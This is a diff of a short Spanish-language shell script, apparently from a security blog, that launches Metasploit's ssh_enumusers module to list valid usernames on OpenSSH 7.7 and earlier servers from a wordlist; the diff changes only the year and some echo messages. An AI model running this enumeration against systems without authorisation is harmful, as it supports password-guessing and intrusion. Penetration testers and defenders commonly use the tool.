@@ -1,15 +1,15 @@
 #!/bin/sh
 # Ver usuarios existentes en OpenSSH 7.7 y versiones anteriores
-# Antonio Taboada - hackingyseguridad.com 2025
+# Antonio Taboada - hackingyseguridad.com 2026
 # OpenSSH < 7.7 - User Enumeration
 # Descargar diccionario de usuarios
 
 echo
 echo "Enumeración de usuarios SSH, versiones OpenSSH 7.7 y anteriores"
-echo
+echo ".."
 echo "..."
 echo "Uso.: sh enumuser.sh IP"
-echo
+echo "al finalizar, para salir teclear exit"
 # Ejecutamos metaxploit
 # para salir teclea exit
 msfconsole -q -x "use auxiliary/scanner/ssh/ssh_enumusers; set RHOSTS $1; set RPORT 22; set USER_FILE /home/antonio/ssha/usuarios0.txt; run"
